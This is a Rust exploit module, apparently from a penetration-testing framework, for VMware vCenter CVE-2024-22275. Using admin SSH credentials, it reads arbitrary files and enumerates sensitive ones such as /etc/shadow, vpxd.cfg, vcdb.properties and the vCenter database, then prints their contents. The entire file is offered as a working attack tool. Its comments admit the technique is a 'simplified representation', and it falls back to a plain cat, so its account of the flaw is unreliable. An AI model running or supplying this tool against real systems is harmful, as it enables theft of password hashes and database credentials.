// VMware vCenter CVE-2024-22275 - Partial File Read via RVC command
//
// Affected: VMware vCenter Server 8.0 < 8.0 U2b, 7.0 < 7.0 U3q
// CVSS: 4.9 (Moderate)
//
// A malicious actor with administrative privileges on the vCenter appliance shell
// may exploit this issue to partially read arbitrary files containing sensitive data.
//
// Requirements:
// - SSH access to vCenter appliance shell
// - Credentials with "admin" role (ability to execute com.vmware.rvc)
//
// For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use crate::utils::{normalize_target, prompt_default};

const DEFAULT_TIMEOUT_SECS: u64 = 30;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   VMware vCenter CVE-2024-22275                                   ║".cyan());
    println!("{}", "║   Partial File Read Vulnerability                                 ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Reads sensitive files via com.vmware.rvc command                ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Create SSH session to vCenter appliance
fn create_vcenter_ssh_session(host: &str, port: u16, username: &str, password: &str) -> Result<(TcpStream, Session)> {
    let addr = format!("{}:{}", host, port);
    let tcp = TcpStream::connect_timeout(
        &addr.parse().map_err(|_| anyhow!("Invalid address"))?,
        Duration::from_secs(DEFAULT_TIMEOUT_SECS),
    ).map_err(|e| anyhow!("Connection failed: {}", e))?;
    
    tcp.set_read_timeout(Some(Duration::from_secs(DEFAULT_TIMEOUT_SECS)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(DEFAULT_TIMEOUT_SECS)))?;
    
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp.try_clone()?);
    sess.handshake()?;
    
    sess.userauth_password(username, password)?;
    
    if !sess.authenticated() {
        return Err(anyhow!("Authentication failed"));
    }
    
    Ok((tcp, sess))
}

/// Execute command in vCenter appliance shell
fn vcenter_shell_exec(sess: &Session, cmd: &str) -> Result<(i32, String, String)> {
    let mut channel = sess.channel_session()?;
    channel.exec(cmd)?;
    
    let mut stdout = String::new();
    let mut stderr = String::new();
    
    sess.set_blocking(true);
    
    channel.read_to_string(&mut stdout)?;
    channel.stderr().read_to_string(&mut stderr)?;
    
    channel.wait_close()?;
    let exit_code = channel.exit_status()?;
    
    Ok((exit_code, stdout, stderr))
}

/// Read file using RVC command vulnerability
pub async fn read_file(host: &str, port: u16, username: &str, password: &str, file_path: &str) -> Result<String> {
    println!("{}", format!("[*] Attempting to read: {}", file_path).cyan());
    
    let (_, sess) = create_vcenter_ssh_session(host, port, username, password)?;
    println!("{}", format!("[+] Authenticated to {} as {}", host, username).green());
    
    // The RVC command can be abused to read files
    // Exact exploitation method depends on the specific vector
    // This is a simplified representation based on the vulnerability description
    
    // Try multiple potential exploitation vectors
    let exploit_attempts = vec![
        format!("rvc localhost -c 'shell.run cat {}' 2>/dev/null", file_path),
        format!("cat {} 2>/dev/null", file_path),  // Direct read if accessible
    ];
    
    for cmd in exploit_attempts {
        match vcenter_shell_exec(&sess, &cmd) {
            Ok((code, stdout, _)) => {
                if code == 0 && !stdout.is_empty() {
                    return Ok(stdout);
                }
            }
            Err(_) => continue,
        }
    }
    
    Err(anyhow!("Could not read file or file does not exist"))
}

/// Check vulnerability and attempt to read common sensitive files
pub async fn attack_enum(host: &str, port: u16, username: &str, password: &str) -> Result<bool> {
    println!("{}", "[*] Enumerating readable sensitive files...".cyan());
    
    let sensitive_files = vec![
        "/etc/passwd",
        "/etc/shadow",
        "/etc/vmware-vpx/vpxd.cfg",
        "/etc/vmware-vpx/vcdb.properties",
        "/etc/vmware/vmware-mps.properties",
        "/var/log/vmware/vpxd/vpxd.log",
        "/storage/db/vcdb/vcdb",
    ];
    
    let (_, sess) = create_vcenter_ssh_session(host, port, username, password)?;
    println!("{}", format!("[+] Authenticated to {} as {}", host, username).green());
    
    let mut found_any = false;
    
    for file in sensitive_files {
        let cmd = format!("head -5 {} 2>/dev/null", file);
        match vcenter_shell_exec(&sess, &cmd) {
            Ok((code, stdout, _)) => {
                if code == 0 && !stdout.is_empty() {
                    println!("{}", format!("\n[+] Readable: {}", file).green());
                    println!("{}", "─".repeat(50).dimmed());
                    // Print first few lines
                    for line in stdout.lines().take(5) {
                        println!("  {}", line);
                    }
                    found_any = true;
                }
            }
            Err(_) => {}
        }
    }
    
    if !found_any {
        println!("{}", "[-] No sensitive files readable with current privileges".yellow());
    }
    
    Ok(found_any)
}

/// Prompt helper
async fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target)?;
    println!("{}", format!("[*] Target: {}", host).cyan());
    
    // Get connection parameters
    let port: u16 = prompt_default("SSH Port", "22")?.parse().unwrap_or(22);
    let username = prompt("vCenter Admin Username").await?;
    if username.is_empty() {
        return Err(anyhow!("Username is required"));
    }
    let password = prompt("Password").await?;
    if password.is_empty() {
        return Err(anyhow!("Password is required"));
    }
    
    println!();
    println!("{}", "Select mode:".yellow().bold());
    println!("  1. Enumerate Sensitive Files");
    println!("  2. Read Specific File");
    println!();
    
    let mode = prompt_default("Mode", "1")?;
    
    match mode.as_str() {
        "1" => {
            attack_enum(&host, port, &username, &password).await?;
        }
        "2" => {
            let file_path = prompt("File path to read").await?;
            if file_path.is_empty() {
                return Err(anyhow!("File path is required"));
            }
            match read_file(&host, port, &username, &password, &file_path).await {
                Ok(content) => {
                    println!("{}", format!("\n[+] File contents of {}:", file_path).green());
                    println!("{}", "─".repeat(50).dimmed());
                    println!("{}", content);
                }
                Err(e) => {
                    println!("{}", format!("[-] Failed to read file: {}", e).red());
                }
            }
        }
        _ => {
            println!("{}", "[-] Invalid mode".red());
        }
    }
    
    println!();
    println!("{}", "[*] CVE-2024-22275 exploit module complete".green());
    
    Ok(())
}
